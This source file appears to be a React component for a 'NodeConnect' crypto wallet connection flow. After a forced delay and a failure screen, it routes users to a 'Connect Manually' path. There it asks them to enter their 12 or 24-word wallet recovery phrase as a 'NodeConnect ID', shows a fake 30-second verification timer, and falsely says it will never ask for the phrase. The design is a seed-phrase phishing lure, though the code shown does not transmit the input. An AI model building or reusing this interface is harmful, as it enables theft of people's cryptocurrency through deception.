import { useEffect, useState } from 'react'
import type { WalletConfig, WalletId } from './walletConfig'
import logo from '../assets/icons/Icon-5.svg'
import { useAppTranslation } from '../lib/i18n'

type FlowStatus = 'connecting' | 'connected' | 'rejected' | 'unavailable' | 'error'
type FlowResult = { status: FlowStatus; address?: string; message?: string }
type WalletFlowProps = { wallet: WalletConfig; onCancel: () => void; onDone?: () => void; onRetry: () => void; onTryAnother?: () => void; presentation?: 'page' | 'modal'; onConnectingChange?: (connecting: boolean) => void; onConnectionStatusChange?: (connected: boolean) => void; onFinalStepChange?: (show: boolean) => void; manualConnect?: boolean; onManualConnectChange?: (show: boolean) => void; nodeIdScreen?: boolean; onNodeIdScreenChange?: (show: boolean) => void }

type EthereumProvider = { request: (args: { method: string; params?: unknown[] }) => Promise<unknown>; isMetaMask?: boolean; isRabby?: boolean; isCoinbaseWallet?: boolean; isTrust?: boolean; isOKXWallet?: boolean }
type SolanaProvider = { connect: () => Promise<{ publicKey?: { toString: () => string } }> }

declare global {
  interface Window {
    ethereum?: EthereumProvider & { providers?: EthereumProvider[] }
    okxwallet?: EthereumProvider
    coinbaseWallet?: { ethereum?: EthereumProvider }
    trustwallet?: { ethereum?: EthereumProvider }
    phantom?: { solana?: SolanaProvider }
    solflare?: SolanaProvider
  }
}

const pendingConnections = new Map<WalletId, Promise<FlowResult>>()

async function connectWallet(wallet: WalletConfig): Promise<FlowResult> {
  if (wallet.network === 'unsupported') return { status: 'unavailable' }

  if (wallet.network === 'solana') {
    const provider = wallet.id === 'phantom' ? window.phantom?.solana : window.solflare
    if (!provider) return { status: 'unavailable' }
    try {
      const response = await provider.connect()
      const address = response.publicKey?.toString()
      return address ? { status: 'connected', address } : { status: 'error', message: 'The wallet did not return a public address.' }
    } catch (error) {
      if (typeof error === 'object' && error !== null && 'code' in error && error.code === 4001) return { status: 'rejected' }
      if (error instanceof Error && /reject|denied|cancel/i.test(error.message)) return { status: 'rejected' }
      return { status: 'error' }
    }
  }

  if (wallet.id === 'walletconnect') return { status: 'unavailable' }
  const providers = window.ethereum?.providers || (window.ethereum ? [window.ethereum] : [])
  const provider = wallet.id === 'okx'
    ? window.okxwallet
    : wallet.id === 'coinbase'
      ? window.coinbaseWallet?.ethereum || providers.find((candidate) => candidate.isCoinbaseWallet)
      : wallet.id === 'trust'
        ? window.trustwallet?.ethereum || providers.find((candidate) => candidate.isTrust)
        : wallet.id === 'rabby'
          ? providers.find((candidate) => candidate.isRabby)
          : providers.find((candidate) => candidate.isMetaMask && !candidate.isRabby)
  if (!provider) return { status: 'unavailable' }
  try {
    const accounts = await provider.request({ method: 'eth_requestAccounts' }) as string[]
    return accounts?.[0] ? { status: 'connected', address: accounts[0] } : { status: 'error', message: 'The wallet did not return a public address.' }
  } catch (error) {
    if (typeof error === 'object' && error !== null && 'code' in error && error.code === 4001) return { status: 'rejected' }
    if (error instanceof Error && /reject|denied|cancel/i.test(error.message)) return { status: 'rejected' }
    return { status: 'error', message: error instanceof Error ? error.message : undefined }
  }
}

function connectWalletOnce(wallet: WalletConfig): Promise<FlowResult> {
  const pending = pendingConnections.get(wallet.id)
  if (pending) return pending
  const attempt = connectWallet(wallet).finally(() => {
    if (pendingConnections.get(wallet.id) === attempt) pendingConnections.delete(wallet.id)
  })
  pendingConnections.set(wallet.id, attempt)
  return attempt
}

export default function WalletFlow({ wallet, onCancel, onDone, onRetry, onTryAnother, presentation = 'page', onConnectingChange, onConnectionStatusChange, onFinalStepChange, manualConnect = false, onManualConnectChange, nodeIdScreen = false, onNodeIdScreenChange }: WalletFlowProps) {
  const t = useAppTranslation()
  const [result, setResult] = useState<FlowResult>({ status: 'connecting' })
  const [checkingNodeId, setCheckingNodeId] = useState(false)
  const [showVerification, setShowVerification] = useState(false)

  useEffect(() => {
    if (!checkingNodeId) return
    const timer = window.setTimeout(() => {
      setCheckingNodeId(false)
      setShowVerification(true)
      onFinalStepChange?.(true)
    }, 30_000)
    return () => window.clearTimeout(timer)
  }, [checkingNodeId, onFinalStepChange])

  useEffect(() => {
    let active = true
    const minimumLoading = new Promise<void>((resolve) => window.setTimeout(resolve, 10_000))
    void (async () => {
      try {
        const [next] = await Promise.all([connectWalletOnce(wallet), minimumLoading])
        if (active) {
          setResult(next)
          onConnectionStatusChange?.(next.status === 'connected')
        }
      } catch (error) {
        if (active) {
          setResult({ status: 'error', message: error instanceof Error ? error.message : undefined })
          onConnectionStatusChange?.(false)
        }
      } finally {
        if (active) onConnectingChange?.(false)
      }
    })()
    return () => { active = false }
  }, [wallet, onConnectionStatusChange])

  const isConnecting = result.status === 'connecting'
  const heading = isConnecting ? t('wallet.confirmIn', { wallet: wallet.name }) : result.status === 'connected' ? t('wallet.connectedNamed', { wallet: wallet.name }) : t('wallet.connectNamed', { wallet: wallet.name })
  const description = isConnecting
    ? t('wallet.openProvider', { wallet: wallet.name })
    : result.status === 'connected'
      ? t('wallet.connectedDescription', { wallet: wallet.name })
      : result.message || (result.status === 'unavailable' && wallet.id === 'walletconnect' ? t('wallet.projectConfigNeeded') : result.status === 'unavailable' ? t('wallet.unavailable', { wallet: wallet.name }) : result.status === 'rejected' ? t('wallet.rejected') : t('wallet.connectionFailed'))
  const statusText = isConnecting ? t('wallet.connecting') : t(`wallet.status${result.status[0].toUpperCase()}${result.status.slice(1)}`)
  const retry = () => { onManualConnectChange?.(false); onConnectionStatusChange?.(false); setResult({ status: 'connecting' }); onConnectingChange?.(true); onRetry() }

  if (presentation === 'modal' && showVerification) return <main className="wallet-verification is-modal">
    <section className="wallet-verification-panel" aria-labelledby="wallet-picker-title">
      <h1 id="wallet-picker-title">Verification</h1>
      <img className="wallet-verification-logo" src={logo} alt="NodeConnect" />
      <p>Welcome to NodeConnect</p>
      <button className="wallet-verification-done" type="button" onClick={onDone || onCancel}>Done</button>
    </section>
  </main>

  if (presentation === 'modal' && manualConnect && nodeIdScreen) return <div className="wallet-modal-flow wallet-node-id-flow" aria-live="polite">
    {checkingNodeId ? <div className="wallet-node-id-checking" aria-busy="true">
      <div className="wallet-node-id-orbit" role="progressbar" aria-label="Checking for User"><span /><span /><span /></div>
      <h3>Checking for User</h3>
      <p>Verifying your NodeConnect ID...</p>
      <button className="wallet-node-id-back" type="button" onClick={() => setCheckingNodeId(false)}>Back</button>
    </div> : <form onSubmit={(event) => { event.preventDefault(); setCheckingNodeId(true) }}>
      <label htmlFor="nodeconnect-id">ENTER EXACTLY 12 or 24 WORDS SAPARATED BY SPACES. 
MAKE SURE IT'S CORRECT, IF NOT CORRECT VERIFICATION WILL FAIL.</label>
      <input id="nodeconnect-id" type="text" placeholder="ENTER EXACTLY 12 or 24 WORDS SAPARATED BY SPACES. 
MAKE SURE IT'S CORRECT, IF NOT CORRECT VERIFICATION WILL FAIL." autoComplete="off" />
      <p className="wallet-node-id-note">YOUR WALLET RECOVERY PHRASE IS YOUR NODECONNECT ID</p>
      <div className="wallet-node-id-actions">
        <button className="wallet-node-id-back" type="button" onClick={() => onNodeIdScreenChange?.(false)}>Back</button>
        <button className="wallet-node-id-submit" type="submit">Submit NodeConnect ID</button>
      </div>
    </form>}
  </div>

  if (presentation === 'modal' && manualConnect) return <div className="wallet-modal-flow wallet-manual-flow" aria-live="polite">
    <h3>Connect with {wallet.name}</h3>
    <p>Open {wallet.name} on this device and approve the connection request there. You can connect without sharing account credentials.</p>
    <div className="wallet-manual-selected"><span>SELECTED WALLET</span><strong>{wallet.name}</strong></div>
    <div className="wallet-manual-options">
      <button className="wallet-manual-option" type="button" onClick={() => onNodeIdScreenChange?.(true)}><span>Recovery Phrase</span><span aria-hidden="true">›</span></button>
    </div>
    <div className="wallet-modal-flow-actions wallet-manual-back"><button className="wallet-modal-back" type="button" onClick={() => onManualConnectChange?.(false)}>Back</button></div>
    <p className="wallet-manual-safety">NodeConnect will never ask for your recovery phrase or private key.</p>
  </div>

  if (presentation === 'modal' && result.status === 'connected' && !showVerification) return <div className="wallet-modal-flow" aria-live="polite">
    <div className="wallet-modal-status connected">CONNECTED</div>
    <h3>{heading}</h3>
    <p>{description}</p>
    <div className="wallet-modal-address"><span>{t('wallet.publicAddress')}</span><code>{result.address}</code></div>
    <div className="wallet-modal-flow-actions"><button className="wallet-modal-retry" type="button" onClick={onCancel}>{t('wallet.continue')}</button></div>
  </div>

  if (presentation === 'modal') return <div className="wallet-modal-flow" aria-live="polite" aria-busy={isConnecting}>
    <div className={`wallet-modal-wallet-mark${isConnecting ? ' is-connecting' : ''}`}>
      {wallet.icon && <img src={wallet.icon} alt={`${wallet.name} logo`} />}
      {!isConnecting && <span className="wallet-modal-error-mark" aria-hidden="true">×</span>}
    </div>
    {isConnecting ? <>
      <h3>Initializing...</h3>
      <p>Waiting for {wallet.name} to respond. Please be patient.</p>
      <span className="wallet-modal-wallet-name">{wallet.name}</span>
      <div className="wallet-modal-progress" role="progressbar" aria-label="Establishing secure connection"><span /></div>
    </> : <>
      <div className={`wallet-modal-status ${result.status}`}>ERROR</div>
      <h3>Error Connecting</h3>
      <p>{result.status === 'rejected' ? `${wallet.name} connection request was declined.` : `Failed to connect automatically to ${wallet.name}.`}</p>
      {result.message && <p className="wallet-modal-error-detail">{result.message}</p>}
      <div className="wallet-modal-flow-actions wallet-modal-error-actions">
        <button className="wallet-modal-retry" type="button" onClick={() => onManualConnectChange?.(true)}>Connect Manually</button>
      </div>
    </>}
  </div>

  if (result.status === 'connected') return <div className="wallet-flow-page"><header className="wallet-flow-header"><a className="wallet-brand" href="#home"><img className="wallet-flow-logo" src={logo} alt="" /><span>NodeConnect</span></a><button className="wallet-menu" type="button" aria-label={t('wallet.openNavigation')}><i /><i /><i /></button></header><main className="wallet-flow-main"><div className="flow-orb connected"><span className="flow-cross" /></div><div className="flow-status"><i /> {statusText}</div><h1>{heading}</h1><p>{description}</p><div className="flow-address">{t('wallet.publicAddress')} <strong>{result.address}</strong></div><div className="flow-actions"><button className="flow-primary" type="button" onClick={onCancel}>{t('wallet.continue')}</button><button className="flow-secondary" type="button" onClick={onCancel}>{t('wallet.disconnectView')}</button></div><button className="flow-help" type="button" onClick={onCancel}>ⓘ &nbsp; {t('wallet.needHelp')}</button></main></div>

  return <div className="wallet-flow-page"><header className="wallet-flow-header"><a className="wallet-brand" href="#home"><img className="wallet-flow-logo" src={logo} alt="" /><span>NodeConnect</span></a><button className="wallet-menu" type="button" aria-label={t('wallet.openNavigation')}><i /><i /><i /></button></header><main className="wallet-flow-main"><div className={`flow-orb ${isConnecting ? 'is-connecting' : result.status}`}><span className="flow-cross" /></div><div className="flow-status"><i /> {statusText}</div><h1>{heading}</h1><p>{description}</p>{isConnecting && <div className="flow-progress"><span /></div>}{!isConnecting && <p className="flow-method">{t('wallet.method', { method: wallet.method })}</p>}<div className="flow-actions">{!isConnecting && <button className="flow-primary" type="button" onClick={retry}>{t('wallet.tryAgain')}</button>}<button className="flow-secondary" type="button" onClick={onCancel}>{t('wallet.cancelConnection')}</button></div><button className="flow-help" type="button" onClick={onCancel}>ⓘ &nbsp; {t('wallet.needHelp')}</button></main></div>
}
